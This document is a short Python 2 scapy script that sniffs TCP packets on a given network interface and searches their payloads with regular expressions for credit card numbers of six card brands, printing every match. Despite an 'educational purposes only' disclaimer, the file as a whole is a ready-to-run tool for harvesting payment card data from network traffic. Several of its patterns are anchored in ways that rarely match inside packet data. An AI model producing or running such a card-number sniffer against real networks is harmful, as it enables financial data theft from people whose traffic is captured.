#!/usr/bin/env python2
import re, argparse, sys
from scapy.all import *

## Cannot emphasize enough... !!! FOR EDUCATIONAL PURPOSES ONLY !!!

Notes = """\
According to http://www.regular-expressions.info/creditcard.html :

# AmEx start with 34 or 37 and have 15 digits
# Mastercard either start with the numbers 51 through 55 or with the numbers 2221 through 2720. All have 16 digits
# Visa start with a 4. New cards have 16 digits. Old cards have 13
# Diner's Club begin with 300 through 305, 36 or 38. All have 14 digits. There are Diners Club cards that begin with 5 and have 16 digits. These are a joint venture between Diners Club and MasterCard, and should be processed like a MasterCard.
# Discover card begin with 6011 or 65. All have 16 digits
# JCB cards beginning with 2131 or 1800 have 15 digits. JCB cards beginning with 35 have 16 digits
"""

def ccSearch(pkt):
    Finder = {}
    inp = pkt.sprintf('%Raw.load%')
    Finder["AmEx"] = re.findall("3[47][0-9]{13}",inp) or 0
    Finder["MC"] = re.findall("5[1-5][0-9]{14}",inp) or 0
    Finder["Visa"] = re.findall("4[0-9]{12}(?:[0-9]{3})?",inp) or 0
    Finder["DinersClub"] = re.findall("^3(?:0[0-5]|[68][0-9])[0-9]{11}$",inp) or 0
    Finder["Discover"] = re.findall("^6(?:011|5[0-9]{2})[0-9]{12}$",inp) or 0
    Finder["JCB"] = re.findall("^(?:2131|1800|35\d{3})\d{11}$",inp) or 0
    printer(Finder)


def printer(ZZ):
    for key, value in ZZ.iteritems():
        if value != 0:
            print("[+] %s # %s" % (key, ", ".join(value)))


def getargs():
    ap = argparse.ArgumentParser(description="Sniff arbitrary interface for packets, search packet data payload for credit card numbers")
    ap.add_argument('-i', '--interface', type=str, default=None, help="Interface to packet capture on")
    args, l = ap.parse_known_args()
    if args.interface == None:
        ap.print_help()
        sys.exit()
    else:
        return args.interface


def main():
    iface = getargs()
    try:
        sniff(filter='tcp', iface=iface, prn=ccSearch, store=0)
    except KeyboardInterrupt:
        sys.exit()


if __name__=="__main__":
    main()
